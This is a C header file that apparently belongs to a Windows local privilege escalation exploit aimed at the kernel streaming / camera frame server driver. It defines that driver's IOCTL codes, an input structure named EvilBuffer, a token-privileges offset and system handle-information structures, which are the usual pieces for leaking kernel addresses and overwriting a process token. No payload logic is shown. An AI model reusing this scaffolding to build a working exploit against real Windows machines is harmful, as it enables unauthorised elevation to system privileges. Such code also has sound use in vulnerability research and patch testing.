#pragma once
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdint.h>

#define IOCTL_IniContextRendezv 0x2F0400
#define IOCTL_ZwUpdateWnfStateData 0x2F0428
#define IOCTL_RegisterContext 0x2F041C
#define IOCTL_FSUpdateCamerStreamingConsent 0x2F042C
#define IOCTL_KSPropertyHandle 0x2F0003
#define IOCTL_InitializeStream 0x2F0404
#define IOCTL_RegisterStream 0x2F0420
#define IOCTL_PublishTx 0x2F0408
#define IOCTL_ConsumeTx 0x2F0410

#define OFFSET_OF_TOKEN_PRIVILEGES 0x40 // Windows X >= Windows Vista

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)11
#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)16
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#pragma pack(push, 1)
typedef struct _EvilBuffer {
    uint64_t size;
    uint64_t txsize;
    uint64_t rxsize;
    uint32_t txcount;
    uint32_t rxcount;
    uint64_t value;
    uint64_t value2;
    uint64_t virtualAddress1;
    uint64_t timestamp;
    uint64_t field9;
    uint64_t virtualAddress2;
    uint64_t field10;
    uint64_t size1;
    uint64_t virtualAddress3;
    uint64_t size2;
    uint32_t Priority;
    uint32_t flag;
    uint64_t resolution;
    uint64_t field11;
    uint64_t field12;
    uint64_t format;
    uint64_t field13;
    uint64_t dimension;
    uint64_t field14;
    uint8_t reserved2[0x110];
} EvilBuffer;

typedef struct _ConsumeTxOut {
    uint64_t size;
    uint64_t txsize;
    uint64_t rxsize;
    uint32_t txcount;
    uint32_t rxcount;
    uint64_t value;
    uint64_t counter;
    uint64_t empty1;
    uint64_t empty2;
    uint64_t empty3;
    uint8_t *PageVaAddressRW;
    uint64_t empty5;
    uint64_t empty6;
    uint8_t *PageVaAddressR;
    uint8_t reserved2[0xF68];
} ConsumeTxOut;
#pragma pack(pop)

typedef struct _MY_IRP
{
    uint64_t Type;
    PVOID CurrentProcId;
    uint64_t Flags;
    HANDLE hEvent;
} MY_IRP;

typedef struct _PublishTxOut
{
    uint64_t txsize;
    uint64_t rxsize;
    uint32_t txcount;
    uint32_t rxcount;
} PublishTxOut;

typedef struct _InputBuffer
{
    uint64_t Type;
    PVOID CurrentProcId;
    uint64_t Flags;
    uint64_t qword18;
    uint64_t qword20;
    HANDLE hEvent;
} InputBuffer;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    unsigned short UniqueProcessId;
    unsigned short CreatorBackTraceIndex;
    unsigned char ObjectTypeIndex;
    unsigned char HandleAttributes;
    unsigned short HandleValue;
    void* Object;
    unsigned long GrantedAccess;
    long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    unsigned long NumberOfHandles;
    struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
